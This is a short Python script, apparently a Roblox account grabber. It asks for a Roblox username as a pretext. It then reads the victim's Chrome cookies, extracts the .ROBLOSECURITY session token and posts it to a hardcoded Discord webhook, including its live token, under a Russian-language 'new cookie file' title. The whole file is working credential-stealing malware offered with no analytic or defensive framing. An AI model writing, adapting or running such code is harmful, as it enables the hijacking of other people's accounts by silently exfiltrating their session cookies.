from discord_webhook import DiscordWebhook, DiscordEmbed
import requests
import threading
import browser_cookie3 as cookie
import time

name = input('Enter your roblox username: ')

webhookl = DiscordWebhook(url='https://discord.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')


def getCookiesFromPc():
    req = requests.Session()
    cj = cookie.chrome()
    req.cookies = cj
    r = req.get("https://www.roblox.com/")
    for c in req.cookies:
        if c.name == ".ROBLOSECURITY":
            webhook = DiscordWebhook(url='https://discordapp.com/api/webhooks/1010031153144676434/8PDj8P32e4SW2qlQXyqi3HNm2NWNKlR6-MmkgZIbf1HSMR5d3DyziJLcHMGvrxILhPIP')
            embed = DiscordEmbed(title='🍪 Новый куки файл!', description=f'{c.value}', color='03b2f8')
            webhook.add_embed(embed)
            response = webhook.execute()

getCookiesFromPc()